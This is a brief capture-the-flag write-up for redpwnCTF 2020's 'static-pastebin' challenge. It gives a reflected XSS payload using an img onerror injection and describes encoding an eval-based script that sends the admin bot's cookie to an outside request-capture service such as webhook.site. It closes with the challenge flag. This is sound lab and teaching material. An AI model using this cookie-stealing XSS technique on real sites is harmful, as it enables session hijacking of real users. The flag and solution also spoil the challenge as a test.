**Challenge:** https://static-pastebin.2020.redpwnc.tf/

Reflected XSS Payload: `><img src onerror="<JS code to receive the flag>"`

Test [`><img src onerror="alert(document.domain)"`](https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=)

The flag will be the Admin's cookie. You only need to send a paylaod to Admin and make a redirect to your HTTP server with Admin's cookie.

Create an HTTP server or you can use some online solutions like https://webhook.site/ or https://requestbin.com/.

Use this [javascript code](https://gist.github.com/EffectRenan/9e85ddc199668e7b56decd88c875ef6e) to generate a payload which use `eval` function.
  - Edit the variable `host` with your URL.
  - Execute: `node eval-charcode.js | base64`. *Ps: Base64 encode is necessary to exploit it.*

Final payload: `https://static-pastebin.2020.redpwnc.tf/paste/#<base64 generated>`

Send this URL to Admin at `https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin` and you will receive a request with the flag.

**Flag:** flag{54n1t1z4t10n_k1nd4_h4rd}
